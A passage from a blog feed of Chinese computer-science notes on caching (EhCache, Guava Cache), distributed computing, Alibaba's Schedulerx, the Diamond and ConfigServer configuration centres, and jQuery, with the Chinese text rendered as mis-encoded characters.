<p>è¦å†™å…¥ç¼“å­˜çš„æ•°æ®éƒ½æ˜¯ä» mysql é‡ŒæŸ¥å‡ºæ¥çš„ï¼Œéƒ½å¾—å†™å…¥ mysql ä¸­ï¼Œå†™å…¥ mysql ä¸­çš„æ—¶å€™å¿…é¡»ä¿å­˜ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œä» mysql æŸ¥å‡ºæ¥çš„æ—¶å€™ï¼Œæ—¶é—´æˆ³ä¹Ÿè¦æŸ¥å‡ºæ¥ã€‚</p>
<p>æ¯æ¬¡è¦å†™ä¹‹å‰ï¼Œå…ˆåˆ¤æ–­ä¸€ä¸‹å½“å‰è¿™ä¸ª value çš„æ—¶é—´æˆ³æ˜¯å¦æ¯”ç¼“å­˜é‡Œçš„ value çš„æ—¶é—´æˆ³è¦æ–°ã€‚å¦‚æœæ˜¯çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥å†™ï¼Œå¦åˆ™ï¼Œå°±ä¸èƒ½ç”¨æ—§çš„æ•°æ®è¦†ç›–æ–°çš„æ•°æ®ã€‚</p>
<h1 id="å¸¸è§ç¼“å­˜æ¡†æ¶" tabindex="-1"> å¸¸è§ç¼“å­˜æ¡†æ¶</h1>
<h2 id="ehcache" tabindex="-1"> EhCache</h2>
<p>EhCache æ˜¯ä¸€ä¸ªçº¯Javaçš„è¿›ç¨‹å†…ç¼“å­˜æ¡†æ¶ï¼Œå…·æœ‰å¿«é€Ÿã€ç²¾å¹²ç­‰ç‰¹ç‚¹ï¼Œæ˜¯Hibernateä¸­é»˜è®¤CacheProvider</p>
<h3 id="ç‰¹æ€§" tabindex="-1"> ç‰¹æ€§</h3>
<ul>
<li>å¿«é€Ÿã€ç®€å•</li>
<li>å¤šç§ç¼“å­˜ç­–ç•¥</li>
<li>ç¼“å­˜æ•°æ®æœ‰ä¸¤çº§ï¼šå†…å­˜å’Œç£ç›˜</li>
<li>ç¼“å­˜æ•°æ®ä¼šåœ¨è™šæ‹Ÿæœºé‡å¯çš„è¿‡ç¨‹ä¸­å†™å…¥ç£ç›˜</li>
<li>å¯ä»¥é€šè¿‡RMIã€å¯æ’å…¥APIç­‰æ–¹å¼è¿›è¡Œåˆ†å¸ƒå¼ç¼“å­˜</li>
<li>å…·æœ‰ç¼“å­˜å’Œç¼“å­˜ç®¡ç†å™¨çš„ä¾¦å¬æ¥å£</li>
<li>æ”¯æŒå¤šç¼“å­˜ç®¡ç†å™¨å®ä¾‹ï¼Œä»¥åŠä¸€ä¸ªå®ä¾‹çš„å¤šä¸ªç¼“å­˜åŒºåŸŸ</li>
<li>å†…å­˜ç»Ÿè®¡</li>
</ul>
<h3 id="ç“¶é¢ˆ" tabindex="-1"> ç“¶é¢ˆ</h3>
<ul>
<li>
<p>ç¼“å­˜æ¼‚ç§»ï¼ˆCache Driftï¼‰
æ¯ä¸ªåº”ç”¨èŠ‚ç‚¹åªç®¡ç†è‡ªå·±çš„ç¼“å­˜ï¼Œåœ¨æ›´æ–°æŸä¸ªèŠ‚ç‚¹çš„æ—¶å€™ï¼Œä¸ä¼šå½±å“åˆ°å…¶ä»–çš„èŠ‚ç‚¹ï¼Œè¿™æ ·æ•°æ®ä¹‹é—´å¯èƒ½å°±ä¸åŒæ­¥äº†ã€‚</p>
</li>
<li>
<p>æ•°æ®åº“ç“¶é¢ˆï¼ˆDatabase Bottlenecks ï¼‰
å¯¹äºå•å®ä¾‹çš„åº”ç”¨æ¥è¯´ï¼Œç¼“å­˜å¯ä»¥ä¿æŠ¤æ•°æ®åº“çš„è¯»é£æš´ï¼›ä½†æ˜¯ï¼Œåœ¨é›†ç¾¤çš„ç¯å¢ƒä¸‹ï¼Œæ¯ä¸€ä¸ªåº”ç”¨èŠ‚ç‚¹éƒ½è¦å®šæœŸä¿æŒæ•°æ®æœ€æ–°ï¼ŒèŠ‚ç‚¹è¶Šå¤šï¼Œè¦ç»´æŒè¿™æ ·çš„æƒ…å†µå¯¹æ•°æ®åº“çš„å¼€é”€ä¹Ÿè¶Šå¤§ã€‚</p>
</li>
</ul>
<h2 id="guava-cache" tabindex="-1"> Guava Cache</h2>
<p>Guava Cacheæ˜¯Googleå¼€æºçš„Javaé‡ç”¨å·¥å…·é›†åº“Guavaé‡Œçš„ä¸€æ¬¾ç¼“å­˜å·¥å…·ï¼Œå®ƒçš„è®¾è®¡çµæ„Ÿæ¥æºäºConcurrentHashMapï¼Œä½¿ç”¨å¤šä¸ªsegmentsæ–¹å¼çš„ç»†ç²’åº¦é”ï¼Œåœ¨ä¿è¯çº¿ç¨‹å®‰å…¨çš„åŒæ—¶ï¼Œæ”¯æŒé«˜å¹¶å‘åœºæ™¯éœ€æ±‚ï¼ŒåŒæ—¶æ”¯æŒå¤šç§ç±»å‹çš„ç¼“å­˜æ¸…ç†ç­–ç•¥ï¼ŒåŒ…æ‹¬åŸºäºå®¹é‡çš„æ¸…ç†ã€åŸºäºæ—¶é—´çš„æ¸…ç†ã€åŸºäºå¼•ç”¨çš„æ¸…ç†ç­‰ã€‚
Guava cacheæ˜¯googleå¼€å‘çš„ï¼Œç›®å‰è¢«å¸¸ç”¨åœ¨å•æœºä¸Šï¼Œå¦‚æœæ˜¯åˆ†å¸ƒå¼ï¼Œå®ƒå°±æ— èƒ½ä¸ºåŠ›äº†</p>
<h3 id="ç‰¹æ€§-1" tabindex="-1"> ç‰¹æ€§</h3>
<p>guava cacheç±»ä¼¼concurrentMapä½¿ç”¨åˆ†æ®µé”æé«˜å¹¶å‘å†™çš„æ•ˆç‡</p>
<ul>
<li>æ”¯æŒç¼“å­˜ä¸‰ç§ç¼“å­˜æ·˜æ±°ç­–ç•¥</li>
<li>æ”¯æŒç¼“å­˜ç§»é™¤ç›‘å¬(ç§»é™¤ã€è¿‡æœŸã€gcå›æ”¶)</li>
<li>æ”¯æŒkey/valueçš„è½¯å¼•ç”¨ã€å¼±å¼•ç”¨ç¼“å­˜</li>
<li>å‘½ä¸­ç‡ç»Ÿè®¡</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">åˆ†å¸ƒå¼è®¡ç®—</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%AE%A1%E7%AE%97.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="åˆ†å¸ƒå¼è®¡ç®—" tabindex="-1"> åˆ†å¸ƒå¼è®¡ç®—</h1>
<p>åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿæ„å»ºåœ¨åˆ†å¸ƒå¼å­˜å‚¨çš„åŸºç¡€ä¸Šï¼Œå……åˆ†å‘æŒ¥åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ•°æ®å†—ä½™ç¾å¤‡ï¼Œå¤šå‰¯æœ¬é«˜æ•ˆè·å–æ•°æ®çš„ç‰¹æ€§ï¼Œè¿›è€Œå¹¶è¡Œè®¡ç®—ï¼ŒæŠŠåŸæœ¬éœ€è¦é•¿æ—¶é—´è®¡ç®—çš„ä»»åŠ¡æ‹†åˆ†æˆå¤šä¸ªä»»åŠ¡å¹¶è¡Œå¤„ç†ï¼Œä»è€Œæé«˜äº†è®¡ç®—æ•ˆç‡ã€‚åˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿåœ¨åœºæ™¯ä¸Šåˆ†ä¸ºç¦»çº¿è®¡ç®—ï¼Œå®æ—¶è®¡ç®—å’Œæµå¼è®¡ç®—ã€‚</p>
<ul>
<li>ç¦»çº¿ï¼šHadoop</li>
<li>å®æ—¶ï¼šSpark</li>
<li>æµå¼ï¼šStormï¼ŒFlink/Blink</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-18-36.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-18-43.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Schedulerx</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E8%B0%83%E5%BA%A6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="schedulerx" tabindex="-1"> Schedulerx</h1>
<p>Schedulerxæ˜¯é˜¿é‡Œä¸­é—´ä»¶è‡ªç ”çš„åŸºäºAkkaæ¶æ„ï¼ˆAkka in Schedulerx2.0ï¼‰çš„æ–°ä¸€ä»£åˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œæä¾›å®šæ—¶ã€ä»»åŠ¡ç¼–æ’ã€åˆ†å¸ƒå¼è·‘æ‰¹ç­‰åŠŸèƒ½ï¼Œå…·æœ‰é«˜å¯é ã€æµ·é‡ä»»åŠ¡ã€ç§’çº§è°ƒåº¦ã€å¯è¿ç»´ç­‰èƒ½åŠ›ã€‚</p>
<p>Schedulerx2.0å¼€å§‹äº2018-01-22ï¼Œæ²¡æœ‰å‚è€ƒDTSå’ŒSchedulerxï¼Œæ˜¯å…¨æ–°è‡ªç ”çš„ä¸‹ä¸€ä»£ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œä¸ä½†å…¼å®¹è€ç‰ˆæœ¬ç¼–ç¨‹æ¨¡å‹ï¼Œè¿˜æä¾›æ›´å¤šæ›´å¿«æ›´å¼ºçš„èƒ½åŠ›ã€‚</p>
<ul>
<li>æ›´å¤šï¼šæ”¯æŒå¤šç§æ—¶é—´è¡¨è¾¾å¼ï¼Œä»»åŠ¡ç¼–æ’ï¼Œæ”¯æŒæ›´å¤šçš„ä¸šåŠ¡åœºæ™¯ã€‚å•æœºç¾¤æ”¯æŒä¸Šåƒä¸‡ä»»åŠ¡ï¼Œä¸€å¤©ä¸Šåäº¿æ¬¡è°ƒåº¦ï¼Œæ”¯æŒæ›´å¤šçš„ä»»åŠ¡æ•°ã€‚</li>
<li>æ›´å¿«ï¼šæ”¯æŒç§’çº§åˆ«è°ƒåº¦ï¼Œå¤„ç†å‡†å®æ—¶ä¸šåŠ¡ã€‚</li>
<li>æ›´å¼ºï¼šæ”¯æŒæ—¥å¿—æŸ¥è¯¢ã€åŸåœ°é‡è·‘ã€é‡åˆ·æ•°æ®ç­‰å¤šç§æ“ä½œï¼Œæä¾›æ›´å¼ºçš„è¿ç»´èƒ½åŠ›å’Œæ’é”™æ‰‹æ®µã€‚</li>
</ul>
<h2 id="ä¸»è¦åŠŸèƒ½" tabindex="-1"> ä¸»è¦åŠŸèƒ½</h2>
<ul>
<li>å¼ºå¤§çš„å®šæ—¶è°ƒåº¦å™¨ï¼šCrontabï¼Œå½“ç„¶ï¼Œå¿…é¡»æ”¯æŒcrontabè¡¨è¾¾å¼</li>
<li>Fixed rateï¼šä¼—æ‰€å‘¨çŸ¥ï¼Œcrontabå¿…é¡»è¢«60æ•´é™¤ï¼Œæ¯”å¦‚æƒ³æ¯éš”40åˆ†é’Ÿè·‘ä¸€æ¬¡ï¼Œcronä¸æ”¯æŒã€‚Fixed rateä¸“é—¨ç”¨æ¥åšå®šæœŸè½®è¯¢ï¼Œè¡¨è¾¾å¼ç®€å•ã€‚</li>
<li>Fixed delayï¼šé€‚åˆåšè½®è¯¢çš„ä¸šåŠ¡ï¼Œæ¯”å¦‚æ¯æ¬¡æ‰§è¡Œå®Œæˆéš”10ç§’å†è·‘ï¼Œé‚£ä¹ˆfixed delayéå¸¸é€‚åˆä½ ã€‚</li>
<li>æ—¥å†ï¼šæ”¯æŒå¤šç§æ—¥å†ï¼Œè¿˜å¯ä»¥è‡ªå®šä¹‰å¯¼å…¥æ—¥å†ã€‚æ¯”å¦‚é‡‘èä¸šåŠ¡éœ€è¦åœ¨æ¯ä¸ªäº¤æ˜“æ—¥æ‰§è¡Œã€‚</li>
<li>æ—¶åŒºï¼šè·¨å›½çš„ä¸šåŠ¡ï¼Œéœ€è¦åœ¨æ¯ä¸ªå›½å®¶çš„æ—¶åŒºå®šæ—¶æ‰§è¡ŒæŸä¸ªä»»åŠ¡ã€‚</li>
<li>ä»»åŠ¡ç¼–æ’ï¼šschedulerx2.0æ”¯æŒå·¥ä½œæµï¼ˆDAGï¼‰è¿›è¡Œä»»åŠ¡ç¼–æ’ï¼Œæ“ä½œç®€å•ï¼Œå‰ç«¯ç›´æ¥å•æ‰‹æ“ä½œæ‹–æ‹–æ‹½æ‹½å³å¯ã€‚è¯¦ç»†çš„ä»»åŠ¡çŠ¶æ€å›¾èƒ½ä¸€ç›®äº†ç„¶çœ‹åˆ°ä¸‹æ¸¸ä»»åŠ¡ä¸ºä»€ä¹ˆæ²¡è·‘ï¼Œå¦‚ä¸‹å›¾ï¼š
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-46-11.png" alt="" loading="lazy"></li>
<li>ä»»åŠ¡ç±»å‹ï¼šæ”¯æŒå¤šç§ä»»åŠ¡ç±»å‹ï¼Œå¯ä»¥æ— é™æ‰©å±•ï¼
<ul>
<li>javaï¼šå¯ä»¥è·‘åœ¨ç”¨æˆ·è¿›ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ jaråŒ…åŠ¨æ€åŠ è½½ã€‚</li>
<li>shellï¼šå‰ç«¯ç›´æ¥å†™shellè„šæœ¬ã€‚</li>
<li>pythonï¼šå‰ç«¯ç›´æ¥å†™pythonè„šæœ¬ï¼Œéœ€è¦æœºå™¨æœ‰pythonç¯å¢ƒã€‚</li>
<li>goï¼šå‰ç«¯ç›´æ¥å†™goè„šæœ¬ï¼Œéœ€è¦æœºå™¨æœ‰goç¯å¢ƒã€‚</li>
<li>è‡ªå®šä¹‰ï¼šç”¨æˆ·ç”šè‡³å¯ä»¥è‡ªå®šä¹‰ä»»åŠ¡ç±»å‹ï¼Œç„¶åå®ç°ä¸€ä¸ªpluginå°±è¡Œ</li>
</ul>
</li>
<li>æ‰§è¡Œæ–¹å¼&amp;åˆ†å¸ƒå¼ç¼–ç¨‹æ¨¡å‹
<ul>
<li>å•æœºï¼šéšæœºæŒ‘é€‰ä¸€å°æœºå™¨æ‰§è¡Œ</li>
<li>å¹¿æ’­ï¼šæ‰€æœ‰æœºå™¨åŒæ—¶æ‰§è¡Œä¸”ç­‰å¾…å…¨éƒ¨ç»“æŸ</li>
<li>å¹¶è¡Œè®¡ç®—ï¼šmap/mapreduceæ¨¡å‹ï¼Œ1~300ä¸ªå­ä»»åŠ¡ï¼Œæœ‰å­ä»»åŠ¡åˆ—è¡¨ã€‚</li>
<li>å†…å­˜ç½‘æ ¼ï¼šmap/mapreduceæ¨¡å‹ï¼Œ10Wä»¥ä¸‹å­ä»»åŠ¡ï¼Œæ— å­ä»»åŠ¡åˆ—è¡¨ï¼ŒåŸºäºå†…å­˜è®¡ç®—ï¼Œæ¯”ç½‘æ ¼è®¡ç®—å¿«ã€‚</li>
<li>ç½‘æ ¼è®¡ç®—ï¼šmap/mapreduceæ¨¡å‹ï¼Œ100Wä»¥ä¸‹å­ä»»åŠ¡ï¼Œæ— å­ä»»åŠ¡åˆ—è¡¨ï¼ŒåŸºäºæ–‡ä»¶H2è®¡ç®—ã€‚</li>
</ul>
</li>
</ul>
<h2 id="ç³»ç»Ÿæ¶æ„" tabindex="-1"> ç³»ç»Ÿæ¶æ„</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-52-26.png" alt="" loading="lazy"></p>
<p>å¯æ‰©å±•çš„æ‰§è¡Œå¼•æ“</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-52-55.png" alt="" loading="lazy"></p>
<ul>
<li>TaskMasterï¼šç±»ä¼¼äºyarnçš„AppMasterï¼Œæ”¯æŒå¯æ‰©å±•çš„åˆ†å¸ƒå¼æ‰§è¡Œæ¡†æ¶ï¼Œè¿›è¡Œæ•´ä¸ªjobInstanceçš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€containerçš„èµ„æºç®¡ç†ï¼ŒåŒæ—¶è¿˜æœ‰failoverç­‰èƒ½åŠ›ã€‚é»˜è®¤å®ç°StandaloneTaskMasterï¼ˆå•æœºæ‰§è¡Œï¼‰ï¼ŒBroadcastTaskMasterï¼ˆå¹¿æ’­æ‰§è¡Œï¼‰ï¼ŒMapTaskMasterï¼ˆå¹¶è¡Œè®¡ç®—ã€å†…å­˜ç½‘æ ¼ã€ç½‘æ ¼è®¡ç®—ï¼‰ï¼ŒMapReduceTaskMasterï¼ˆå¹¶è¡Œè®¡ç®—ã€å†…å­˜ç½‘æ ¼ã€ç½‘æ ¼è®¡ç®—ï¼‰ã€‚</li>
<li>Containerï¼šæ‰§è¡Œä¸šåŠ¡é€»è¾‘çš„å®¹å™¨æ¡†æ¶ï¼Œæ”¯æŒçº¿ç¨‹/è¿›ç¨‹/docker/actorç­‰ã€‚</li>
<li>Processorï¼šä¸šåŠ¡é€»è¾‘æ¡†æ¶ï¼Œä¸åŒçš„processorè¡¨ç¤ºä¸åŒçš„ä»»åŠ¡ç±»å‹ã€‚</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Diamond</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[<h1 id="diamond" tabindex="-1"> Diamond</h1>
<p>Diamondæ˜¯æ·˜å®å†…éƒ¨å¹¿æ³›ä½¿ç”¨çš„é…ç½®ä¸­å¿ƒï¼Œæä¾›æŒä¹…åŒ–ç®¡ç†å’ŒåŠ¨æ€é…ç½®æ¨é€æœåŠ¡ã€‚ é…ç½®çš„æŒä¹…åŒ–ç®¡ç†ï¼Œæ˜¯Diamondä¸æ·˜å®å†…éƒ¨å¦å¤–ä¸€ä¸ªè½¯è´Ÿè½½é…ç½®äº§å“ConfigServerçš„ä¸»è¦åŒºåˆ«ã€‚åº”ç”¨æ–¹å‘å¸ƒçš„é…ç½®ä¼šé€šè¿‡æŒä¹…åŒ–å­˜å‚¨ä¿å­˜ï¼Œä¸å‘å¸ƒè€…çš„ç”Ÿå‘½å‘¨æœŸæ— å…³ã€‚ åŠ¨æ€é…ç½®æ¨é€ï¼Œåˆ™æ˜¯Diamondçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œåœ¨æ·˜å®å†…éƒ¨æœ‰å¾ˆå¤šåº”ç”¨åœºæ™¯ï¼Œå¦‚æ•°æ®åº“åŠ¨æ€åˆ‡æ¢å’Œæ‰©å®¹ï¼Œä¸šåŠ¡ç³»ç»Ÿå¼€å…³é…ç½®è¿è¡Œæ—¶å˜æ›´ç­‰ã€‚</p>
<p>å®æ—¶çš„åŠ¨æ€é…ç½®æ¨é€ï¼Œæœ¬è´¨ä¸Šæ˜¯å¦‚ä½•æŠŠæœåŠ¡ç«¯çš„æ›´æ–°çŠ¶æ€ï¼Œå®æ—¶å‘é€ç»™å®¢æˆ·ç«¯çš„é—®é¢˜ã€‚ TCPé•¿è¿æ¥æ˜¯æœ€è‡ªç„¶çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œä½†æ˜¯ç”±äºè®¾è®¡ä¸Šï¼ŒDiamondé€‰æ‹©äº†Httpåè®®æä¾›æœåŠ¡ã€‚ å¦‚ä½•åœ¨Httpåè®®çš„Request-Responseé€šä¿¡æ¨¡å‹ä¸‹è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯Diamondé¢ä¸´çš„éš¾é¢˜ã€‚æ·˜å®ç”Ÿäº§ç¯å¢ƒä¸­çš„DiamondæœåŠ¡ï¼Œé‡‡ç”¨äº†åŸºäºæ¨æ¨¡å‹çš„å®¢æˆ·ç«¯é•¿è½®è¯¢çš„æ–¹æ¡ˆæ¥å®ç°åŠ¨æ€é…ç½®å®æ—¶æ¨é€ã€‚ åŸºäºHttpé•¿è½®è¯¢æ¨¡å‹ï¼Œå®ç°äº†è®©å®¢æˆ·ç«¯åœ¨æ²¡æœ‰å‘ç”ŸåŠ¨æ€é…ç½®å˜æ›´çš„æ—¶å€™å‡å°‘è½®è¯¢ã€‚è¿™æ ·å‡å°‘äº†æ— æ„ä¹‰çš„è½®è¯¢è¯·æ±‚é‡ï¼Œæé«˜äº†è½®è¯¢çš„æ•ˆç‡ï¼›ä¹Ÿé™ä½äº†ç³»ç»Ÿè´Ÿè½½ï¼Œæå‡äº†æ•´ä¸ªç³»ç»Ÿçš„èµ„æºåˆ©ç”¨ç‡ã€‚ å¦å¤–ï¼Œè¿™ç§æ¨æ‹‰ç»“åˆçš„ç­–ç•¥ï¼Œåšåˆ°äº†åœ¨é•¿è¿æ¥å’ŒçŸ­è¿æ¥ä¹‹é—´çš„å¹³è¡¡ï¼Œå®ç°ä¸Šè®©æœåŠ¡ç«¯ä¸ç”¨å¤ªå…³æ³¨è¿æ¥çš„ç®¡ç†ï¼Œæ•ˆæœä¸Šåˆè·å¾—äº†ç±»ä¼¼TCPé•¿è¿æ¥çš„ä¿¡æ¯æ¨é€çš„å®æ—¶æ€§ã€‚</p>
<p>Diamondçš„æ¯”è¾ƒé€‚åˆä½é¢‘å˜æ›´çš„åŠ¨æ€é…ç½®ç®¡ç†ï¼Œå¯¹äºé…ç½®çš„å˜æ›´åªä¿è¯æœ€ç»ˆä¸€è‡´æ€§ï¼Œä¸ä¿è¯è¿‡ç¨‹ä¸€è‡´æ€§ï¼›è¦æ±‚æ¥å…¥çš„ä¸šåŠ¡æ»¡è¶³å¹‚ç­‰æ€§ï¼Œæœ‰éƒ¨åˆ†ç”¨æˆ·æ‹¿Diamondåšäº‹ä»¶é€šçŸ¥ï¼Œå¯èƒ½ä¼šå¯¼è‡´äº‹ä»¶ä¸¢å¤±ã€‚</p>
<h1 id="configserver" tabindex="-1"> ConfigServer</h1>
<p>ConfigServerä¸­æ–‡åä¸ºéæŒä¹…é…ç½®ä¸­å¿ƒï¼Œä¸»è¦ç”¨äºéæŒä¹…æ•°æ®çš„å‘å¸ƒå’Œè®¢é˜…ï¼Œæ•°æ®çš„ç”Ÿå‘½å‘¨æœŸå’ŒTCPè¿æ¥ç”Ÿå‘½å‘¨æœŸç»‘å®šï¼Œäº§å“æ¶æ„åŸºäºå‘å¸ƒè®¢é˜…æ¨¡å‹ï¼Œå»ä¸­å¿ƒæ— masterè®¾è®¡ï¼Œä¿è¯äº†ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ã€é«˜å¯ç”¨ã€‚åœ¨é›†å›¢å†…éƒ¨ä¸»è¦åœºæ™¯ä¸ºåˆ†å¸ƒå¼æ¶ˆæ¯ç³»ç»ŸNotifyã€åˆ†å¸ƒå¼RPCæ¡†æ¶HSFæä¾›åœ°å€å‘ç°æœåŠ¡ã€‚</p>
<h2 id="ç‰¹æ€§" tabindex="-1"> ç‰¹æ€§</h2>
<ol>
<li>æ— Masteræ¶æ„ï¼šConfigServeråŸºäºæ— Masteræ¶æ„ConfigServeræ˜¯æ— ä¸­å¿ƒåŒ–çš„æ¶æ„ï¼Œä¸å­˜åœ¨å•ç‚¹é—®é¢˜ï¼Œé€šè¿‡ç‰¹å®šçš„ç®—æ³•è¿›è¡Œæ•°æ®å¢é‡åŒæ­¥ã€‚</li>
<li>è‡ªåŠ¨èšåˆï¼šConfigServeræ”¯æŒæ•°æ®çš„è‡ªåŠ¨èšåˆé…ç½®æ•°æ®çš„èšåˆåŠŸèƒ½ã€‚æ¯å°æœºå™¨å‘ConfigServeræ³¨å†Œè‡ªå·±çš„æœåŠ¡å…ƒä¿¡æ¯ï¼ŒConfigServerä¼šæ ¹æ®æœåŠ¡åå’Œåˆ†ç»„è‡ªåŠ¨èšåˆæ‰€æœ‰å…ƒæ•°æ®ï¼Œæä¾›ç»™æœåŠ¡è®¢é˜…æ–¹ä½¿ç”¨ã€‚</li>
<li>å®æ—¶ï¼šConfigServeræ˜¯æ¨æ•°æ®çš„æ¨¡å‹ConfigServerçš„æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯æ˜¯åŸºäºé•¿è¿æ¥çš„æ–¹å¼è¿›è¡Œé€šä¿¡ï¼Œåœ¨å®¢æˆ·ç«¯è®¢é˜…å…³ç³»ç¡®å®šåï¼Œé…ç½®ä¿¡æ¯ä¸€æ—¦å‘ç”Ÿå˜åŒ–ï¼Œä¼šä¸»åŠ¨æ¨é€é…ç½®æ•°æ®åˆ°å®¢æˆ·ç«¯ï¼Œå¹¶å›è°ƒå®¢æˆ·ç«¯çš„ä¸šåŠ¡ç›‘å¬å™¨</li>
</ol>
<h2 id="åº”ç”¨åœºæ™¯" tabindex="-1"> åº”ç”¨åœºæ™¯</h2>
<ol>
<li>æœåŠ¡å‘ç°ï¼šHSFï¼ŒNotify</li>
<li>éæŒä¹…é…ç½®çš„å‘å¸ƒã€è®¢é˜…ï¼šMtop</li>
<li>é›†ç¾¤ç®¡ç†ï¼šå¤©çŒ«ç›‘æ§ï¼ŒTDD</li>
</ol>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">JQuery ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JS-%E8%BF%9B%E9%98%B6.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="jquery-ä»‹ç»" tabindex="-1"> JQuery ä»‹ç»</h1>
<h2 id="jquery-ç®€ä»‹" tabindex="-1"> JQuery ç®€ä»‹</h2>
<p>jQuery å…¨ç§° javaScript Query æ˜¯jsçš„ä¸€ä¸ªæ¡†æ¶ã€‚</p>
<ol>
<li>jqueryæ˜¯ç”±ç¾å›½äººJohn Resigåˆ›å»ºï¼Œè‡³ä»Šå·²å¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„ä¼—å¤š javascripté«˜æ‰‹åŠ å…¥å…¶teamã€‚</li>
<li>jQueryæ˜¯ç»§prototypeä¹‹ååˆä¸€ä¸ªä¼˜ç§€çš„Javascriptæ¡†æ¶ã€‚å…¶å®—æ—¨æ˜¯â€”â€”WRITE LESS,DO MORE!</li>
<li>å®ƒæ˜¯è½»é‡çº§çš„jsåº“(å‹ç¼©ååªæœ‰21k) ï¼Œè¿™æ˜¯å…¶å®ƒçš„jsåº“æ‰€ä¸åŠçš„ï¼Œå®ƒå…¼å®¹CSS3ï¼Œè¿˜å…¼å®¹å„ç§æµè§ˆå™¨</li>
<li>jQueryæ˜¯ä¸€ä¸ªå¿«é€Ÿçš„ï¼Œç®€æ´çš„javaScriptåº“ï¼Œä½¿ç”¨æˆ·èƒ½æ›´æ–¹ä¾¿åœ°å¤„ç†HTMLdocumentsã€eventsã€å®ç°åŠ¨ç”»æ•ˆæœï¼Œå¹¶ä¸”æ–¹ä¾¿åœ°ä¸ºç½‘ç«™æä¾›AJAXäº¤äº’ã€‚</li>
